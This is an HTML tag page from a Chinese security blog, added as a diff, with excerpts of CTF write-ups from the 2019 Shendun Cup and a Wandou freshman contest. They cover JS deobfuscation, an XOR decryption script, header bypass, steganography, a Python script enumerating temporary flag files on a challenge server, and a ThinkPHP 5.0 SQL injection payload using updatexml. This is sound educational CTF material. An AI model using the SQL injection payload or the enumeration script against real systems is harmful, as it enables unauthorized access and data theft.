@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Php :: Ca1s1&#39;Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://vuln.top/tags/php/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://vuln.top/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://vuln.top/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="https://vuln.top/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Php">
+<meta property="og:description" content="" />
+<meta property="og:url" content="https://vuln.top/tags/php/" />
+<meta property="og:site_name" content="Ca1s1&#39;Blog" />
+
+  
+    <meta property="og:image" content="https://vuln.top/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+  <link href="/tags/php/index.xml" rel="alternate" type="application/rss+xml" title="Ca1s1&#39;Blog" />
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://vuln.top/">
+  <div class="logo">
+    Ca1s1'Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about/">about</a></li>
+        
+      
+        
+          <li><a href="/link/">link</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about/" >about</a></li>
+        
+      
+        
+          <li><a href="/link/" >link</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+  
+  <div class="posts">
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/2019shendun/">2019神盾杯</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2020-08-23 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/js/">js</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p><strong>首届“神盾杯”上海市网络安全竞赛</strong>，去年的比赛。</p>
+<h1 id="0x00-babyjs">0x00 babyJS</h1>
+<p><strong>操作内容：</strong></p>
+<p>查看源码 找不到被调用的<code>CheckLogin</code>函数</p>
+<p><img src="/img/19shendun///image1.png" alt="/img/19shendun/image1.png"></p>
+<p>看到<strong>script</strong>中有用到<code>unespace</code>和<code>escape</code>等函数 用于编码字符串</p>
+<p>将<code>eval</code>传参改为<code>alert</code> 显示为弹窗</p>
+<p><img src="/img/19shendun/image2.png" alt="/img/19shendun/image2.png"></p>
+<p>发现<code>check</code>函数 并将flag与用户输入做比较 得到flag</p>
+<p><img src="/img/19shendun/image3.png" alt="/img/19shendun/image3.png"></p>
+<p><strong>FLAG值：</strong></p>
+<p><strong>flag{a5a5f402f6dc62acd3e848900a17513f}</strong></p>
+<h1 id="0x01-crypto_easy_1">0x01 crypto_easy_1</h1>
+<p><strong>操作内容：</strong></p>
+<p>下载文件</p>
+<p><img src="/img/19shendun/image4.png" alt="/img/19shendun/image4.png"></p>
+<p>发现3行类似的数据 并且长度一致。</p>
+<p>:左边的长度为42 右边的长度为56 ，猜测右边被base64编码过 进行解码 比较长度</p>
+<p><img src="/img/19shendun/image5.png" alt="/img/19shendun/image5.png"></p>
+<p>长度一致 为42</p>
+<p>异或运算一下 可以得到Key随后将key代入 与base64解码后的密文异或比较 得到flag</p>
+<p>解密脚本如下:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>x <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v6&#34;wo5UIP9c4IdCk1o6qZhhB5DKZhVBwBzONl1JRIz:TwB2RyZYBCEVbjBjID17UkUeeDAwPBh1dg86AyAgcSQ4QygYGnAuJQYw&#39;</span>
+</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;zjS0ubQE2hw29FL2qs61ZNOVyFaf6IAjUZ7X8ijuVg:Q1wHADwPAC13PyRlUB90CwUCeHAwGj9hOg0QP34/cjkvY1AOTigOAhkt&#39;</span>
+</span></span><span style="display:flex;"><span>z <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pJryZpVUNpSFi06WlKGkS0Uka6zw1sNCX&#34;h2urQoyg:SXwmSRMdBz0LJwARAGkObhg6CSo5ZCVcIn0LLnkFfRAiGw9kAzM1GDYt&#39;</span>
+</span></span><span style="display:flex;"><span>a, b <span style="color:#f92672">=</span> x<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>c, d <span style="color:#f92672">=</span> y<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>e, f <span style="color:#f92672">=</span> z<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(b)
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(d)
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(f)
+</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#39;X1o1VzIPaVgjbmNvCnQAC0ZHY3BbMUkaeylDYWVOCzZDXwJjR3hTFiw3&#39;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>  i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">42</span>):
+</span></span><span style="display:flex;"><span>    t <span style="color:#f92672">=</span> ord(a[i]) <span style="color:#f92672">^</span> ord(b[i])
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(ord(g[i]) <span style="color:#f92672">^</span> t)
+</span></span><span style="display:flex;"><span>print(flag)
+</span></span></code></pre></div><p><strong>FLAG值：</strong></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/2019shendun/"> →</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h1 class="post-title">
+          <a href="https://vuln.top/posts/wandouctf/">豌豆杯入学CTF</a>
+        </h1>
+        <div class="post-meta">
+          
+            <time class="post-date">
+              2019-10-16 ::
+            </time>
+          
+          
+            <span class="post-author">Ca1s1</span>
+          
+        </div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="https://vuln.top/tags/ctf/">ctf</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/writeup/">writeup</a>&nbsp;
+            
+            #<a href="https://vuln.top/tags/php/">php</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <!-- raw HTML omitted -->
+<hr>
+<p>1.题目:小可爱
+第一步肯定是绕过本地回环地址
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162152/4285938054.png" alt="CC25B038-F2D2-4F85-93F7-F51924B8DAB8.png">
+一开始想到的是<code>x-forward-for</code>等告诉服务器我的地址但发现没有绕过 看题目题目是说来源地址想到了<code>referer</code>成功绕过
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110162315/1177985903.png" alt="BC410D27-3BE1-40E5-ABF5-777F7144F502.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/366387116.png" alt="AEA1A04B-27BA-4393-953B-75D948C95027.png">
+这里没啥思路只能爆破
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2499653827.png" alt="B9E617B3-EF26-477B-B78C-534C490FB3C4.png">
+密码为orange 访问到另外一个页面 然后登录。 发现是一张迪丽热巴的图片 这个主管很喜欢迪丽热巴啊！！
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1630037561.png" alt="122FC809-D249-4228-9EB5-1E7F101BB7C1.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/296032636.png" alt="ADBC80E5-9B6D-4483-B1D4-286FE4B9E3F2.png">
+将图片下载下来，用<code>binwalk</code>查看下发现有压缩包!<code>foremost</code>下得到压缩包发现有密码
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/RujlNg.png" alt="70BBCD6F-2D2E-4D93-8F11-80D576A5CB54.png">
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2411784842.png" alt="DABA844F-3716-4889-96CA-04A7E6137C96.png">
+这个地方解了很久发现使用Dilraba的md5。。。。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2601915022.png" alt="F0312D7E-FC35-4DE9-86AF-D5A0F5796C97.png">
+得到一张图片再一次foremost得到一个压缩包成功拿到flag
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2175607698.png" alt="C065BA1C-B8B1-4157-9E8A-D6BD23ED6440.png">
+2.题目:单身二十年
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/1468141901.png" alt="EA018BA0-F2BB-4204-9784-8E3585F3511B.png"></p>
+<pre tabindex="0"><code>&lt;?php 
+
+header(&#34;Content-type:text/html;charset=utf-8&#34;); 
+show_source(__FILE__); 
+if($_COOKIE[&#39;token&#39;]==&#39;5D41402ABC4B2A76B9719D911017C592&#39;){ 
+    $file    =    &#39;dump/&#39;.md5(base64_encode(mt_rand(1,100))).&#39;.txt&#39;; 
+    file_put_contents($file,file_get_contents(&#39;327A6C4304AD5938EAF0EFB6CC3E53DC.php&#39;)); 
+    sleep(10); 
+    unlink($file); 
+}else{ 
+    header(&#39;Location: index.php&#39;); 
+} 
+
+setcookie(&#34;token&#34;); 
+
+?&gt;
+</code></pre><p>看懂源码发现访问页面会睡眠十秒他会把flag写入到一个1到100随机数字经过base64,md5的txt文件里。
+一种是用burp直接get到这里我就不演示了,我是直接写的python,访问下页面执行脚本就行了。
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3316060136.png" alt="9BB9177B-2227-4784-A0BB-B029ED948AF3.png"></p>
+<pre tabindex="0"><code>import base64
+import hashlib
+import requests
+for i in range(1,101):
+	headers = {&#39;Content-type&#39;:&#39;text/html;charset=utf-8&#39;}
+	encodestr = base64.b64encode(str(i).encode(&#39;utf-8&#39;))
+	cookies = {&#39;token&#39;:&#39;5D41402ABC4B2A76B9719D911017C592&#39;}
+	#print(encodestr)
+	m = hashlib.md5()
+	m.update(encodestr)
+	#print(m.hexdigest())
+	a = m.hexdigest()
+	url = &#39;http://106.14.145.133:8081/web10/dump/&#39;+a+&#39;.txt&#39;
+	#print(url)
+	url_get = requests.get(url,headers=headers,cookies=cookies,timeout=2)
+	#print(url_get.headers)
+	#print(url_get.cookies)
+	if url_get.status_code == 200:
+		print(url_get.text)
+</code></pre><p>3.题目:初心不改
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2370270929.png" alt="1975DE5B-D07B-4569-B8D0-E7171F2A034C.png">
+访问页面发现是一个thinkphp5.0 一猜就是sql注入
+一开始以为是构造一个注入然后load_file到flag后来发现想多了，直接通过payload拿到mysql账号密码
+<code>/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code>
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/2511860583.png" alt="BA7D4195-9527-4B06-A1D8-28ABF453FE46.png">
+主页查看源码发现有一个phpmyadmin，登陆后成功拿到flag
+<img src="https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/3803853201.png" alt="73F165EC-C956-40AD-9106-ADE323691340.png"></p>
+          
+        </div>
+
+        
+          <div>
+            <a class="read-more button" href="/posts/wandouctf/"> →</a>
+          </div>
+        
+      </article>
+    
+
+    <div class="pagination">
+  <div class="pagination__buttons">
+    
+    
+  </div>
+</div>
+
+  </div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
